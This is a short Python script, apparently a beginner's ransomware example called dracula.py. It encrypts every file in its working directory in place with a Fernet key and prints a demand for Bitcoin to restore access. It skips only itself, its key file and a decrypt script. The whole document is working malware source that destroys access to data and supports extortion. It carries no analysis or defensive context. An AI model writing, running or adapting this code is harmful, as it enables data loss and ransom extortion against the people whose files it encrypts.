
#import packages

import os
from cryptography.fernet import Fernet

#let's find the files to encrypt and put them in a list

files = []

for file in os.listdir():
	if file == "dracula.py" or file == "thekey.key" or file == "decrypt.py": #exclude this script
		continue
	if os.path.isfile(file): #exclude directories
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

print("All of your files have been encrypted. Send me BTC to get access to your files again")

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read() #save contents of the files in contents
	contents_encrypted = Fernet(key).encrypt(contents) #encrypt content
	with open(file, "wb") as thefile: #write encrypted  content to the file
		thefile.write(contents_encrypted)
